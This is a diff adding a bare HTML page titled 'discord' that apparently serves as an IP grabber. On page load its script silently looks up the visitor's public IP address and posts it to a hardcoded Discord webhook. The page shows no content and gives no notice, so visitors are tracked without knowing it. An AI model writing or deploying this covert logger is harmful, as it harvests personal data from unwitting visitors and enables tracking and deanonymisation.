@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>discord</title>
+</head>
+<body>
+    <script>
+        // Function to get the user's IP address
+        async function getIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error getting IP address:', error);
+            }
+        }
+
+        // Function to send the IP address to a Discord webhook
+        async function sendToDiscord(ip) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
+            const payload = {
+                content: `User IP Address: ${ip}`
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        // Main function to get IP and send it
+        async function main() {
+            const ip = await getIP();
+            if (ip) {
+                await sendToDiscord(ip);
+            }
+        }
+
+        // Execute the main function on page load
+        window.onload = main;
+    </script>
+</body>
+</html>
